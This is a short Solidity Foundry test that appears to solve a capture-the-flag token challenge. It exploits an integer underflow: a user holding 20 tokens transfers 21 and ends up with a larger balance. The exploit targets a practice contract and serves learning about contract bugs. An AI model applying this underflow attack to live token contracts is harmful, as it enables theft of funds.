// SPDX-License-Indentifier: MIT
// pragma experimental ABIEncoderV2;
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import "../contracts/5Token.sol";
import "forge-std/Test.sol";

contract TokenTest is Test {
    Token private tokenContract;
    address user = address(1234);
    address owner = address(5678);

    constructor() public {
        vm.startPrank(owner);
        tokenContract = new Token(10000);
        // challenge specifies you get 20 tokens to start
        tokenContract.transfer(user, 20);
        vm.stopPrank();
    }

    function testAttackToken() public {
        vm.startPrank(user);
        uint256 initialUserBalance = tokenContract.balanceOf(user);
        tokenContract.transfer(owner, 21);
        uint256 afterUserBalance = tokenContract.balanceOf(user);
        console2.log("afterUserBalance: ", afterUserBalance);
        assertGt(afterUserBalance, initialUserBalance);
        vm.stopPrank();
    }
}
